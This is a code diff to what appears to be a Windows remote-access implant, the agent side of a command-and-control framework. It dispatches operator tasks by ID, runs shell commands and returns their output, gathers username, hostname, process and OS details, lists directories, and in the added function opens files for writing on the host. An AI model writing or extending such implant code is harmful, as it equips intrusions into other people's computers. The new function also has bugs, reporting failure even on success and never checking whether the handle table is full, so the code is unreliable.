@@ -7,7 +7,7 @@
 #include <communication.h>
 #include <commands.h>
 
-#define COMMAND_COUNT 3
+#define COMMAND_COUNT 4
 
 Command commands[COMMAND_COUNT] = {
   {.id = 0, .function = identifyCmd },
@@ -15,23 +15,16 @@ Command commands[COMMAND_COUNT] = {
   
   // fs 
   {.id = 100, .function = fsDirCmd },
+  {.id = 101, .function = fsOpenFileCmd },
 };
 
 void executeCmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {
-
   printf("[+] Got task ID: %u\n", taskId);
-  printf("    -> ActionId: %u\n", taskActionId); 
-  printf("    -> ArgsBuf: %.*s (%u bytes)\n", tlv->bufsize, tlv->buf, tlv->bufsize); 
-
+  printf("    -> CommandId: %u\n", taskActionId); 
+  
   for (int i = 0; i < COMMAND_COUNT; i++)
-  {
     if (taskActionId == commands[i].id)
-    {
       commands[i].function(taskId, argc, tlv);
-      break;
-    }
-  }
-
 }
 
 void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
@@ -50,9 +43,9 @@ void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
   HANDLE hStdOutPipeRead = NULL;
   HANDLE hStdOutPipeWrite = NULL;
 
-  PROCESS_INFORMATION ProcessInfo = { };
+  PROCESS_INFORMATION ProcessInfo = { 0 };
   SECURITY_ATTRIBUTES SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
-  STARTUPINFOA StartUpInfoA = { };
+  STARTUPINFOA StartUpInfoA = { 0 };
 
   if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0))
     return;
@@ -74,15 +67,14 @@ void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
   CloseHandle(hStdInPipeRead);
 
   LPVOID pOutputBuffer = NULL;
-  UCHAR buf[1025] = { 0 };
   DWORD dwBufferSize = 0;
   DWORD dwRead = 0;
+  UCHAR buf[1025] = { 0 };
   BOOL SuccessFul = FALSE;
 
   pOutputBuffer = LocalAlloc(LPTR, sizeof(LPVOID));
 
-  do
-  {
+  do {
     SuccessFul = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
 
     if (dwRead == 0) break;
@@ -93,11 +85,11 @@ void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
       LMEM_MOVEABLE | LMEM_ZEROINIT
     );
 
-    dwBufferSize += dwRead;
-
-    memcpy(pOutputBuffer + (dwBufferSize - dwRead), buf, dwRead);
+    memcpy(pOutputBuffer + dwBufferSize, buf, dwRead);
     memset(buf, 0, dwRead);
-  } while (SuccessFul == TRUE);
+
+    dwBufferSize += dwRead;
+  } while (SuccessFul);
 
   addBytes(&out, false, dwBufferSize, pOutputBuffer);
 
@@ -120,18 +112,18 @@ void identifyCmd(int taskId, int argc, struct TLVBuild * tlv) {
   struct TLVBuild identifyMessage = allocStruct(50);
 
   char * username = malloc(UNLEN + 1);
-  DWORD usernameLen = UNLEN + 1;
-  GetUserNameA(username, &usernameLen);
-
   char * hostname = malloc(UNLEN + 1);
-  DWORD hostnameLen = UNLEN + 1;
-  GetComputerNameA(hostname, &hostnameLen);
-  
-  DWORD pid = GetProcessId(GetCurrentProcess());
   char * processName = malloc(260);
-  getProcessName(pid, processName);
 
   OSVERSIONINFOEXW osinfo;
+  DWORD usernameLen = UNLEN + 1;
+  DWORD hostnameLen = UNLEN + 1;
+  DWORD pid;
+
+  pid = GetProcessId(GetCurrentProcess());
+  GetUserNameA(username, &usernameLen);
+  GetComputerNameA(hostname, &hostnameLen);
+  getProcessName(pid, processName);
   agent.functions.RtlGetVersion(&osinfo);
 
   addString (&identifyMessage, username);
@@ -159,7 +151,7 @@ void identifyCmd(int taskId, int argc, struct TLVBuild * tlv) {
 }
 
 void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
-  printf("[+] listing files\n");
+  printf("listing files\n");
 
   struct TLVBuild response = allocStruct(50);
   struct TLVBuild file_list = allocStruct(50);
@@ -169,7 +161,7 @@ void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
   
   int files = 0;
   char * path;
-
+  
   if (argc > 0) extractAllocString(tlv, &path);
   else path = ".\\*";
   
@@ -184,7 +176,7 @@ void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
       files++;
     } while (FindNextFile(hFile, &fdFile));
 
-  };
+  }
 
   addInt32(&response, files);
   addBytes(&response, false, file_list.bufsize, file_list.buf);
@@ -194,4 +186,53 @@ void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
   free(response.buf);
   free(file_list.buf);
   if (argc > 0) free(path);
+}
+
+void fsOpenFileCmd(int taskId, int argc, struct TLVBuild * tlv) {
+  if (argc < 1) return;
+  
+  HANDLE fileHandle;
+  struct TLVBuild output = allocStruct(50);
+  int fileHandleIndex;
+  int success = 0;
+  char * file_path;
+  char * open_for;
+  extractAllocString(tlv, &open_for);
+  extractAllocString(tlv, &file_path);
+
+  printf("Opening file %s for %s\n", file_path, open_for);
+  
+  if (strcmp(open_for, "w") == 0) 
+  {
+    printf("Opening file for writing\n");
+    fileHandle = CreateFile(
+      file_path,
+      GENERIC_WRITE,
+      0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL,
+      NULL
+    );
+
+    if (fileHandle == INVALID_HANDLE_VALUE)
+    {
+      printf("Couldn't open file\n"); 
+      goto _openFileCmd_cleanup; 
+    }
+  } else goto _openFileCmd_cleanup;
+
+  for (fileHandleIndex = 0; fileHandleIndex < 100; fileHandleIndex++)
+    if (agent.fileHandles[fileHandleIndex] == 0) {
+      break;
+    }
+
+  agent.fileHandles[fileHandleIndex] = fileHandle;
+  addInt32(&output, fileHandleIndex);
+
+_openFileCmd_cleanup:
+  if (!success) addInt32(&output, -1);
+
+  sendOutput(taskId, output);
+
+  free(file_path);
+  free(open_for);
+  free(output.buf);
 }
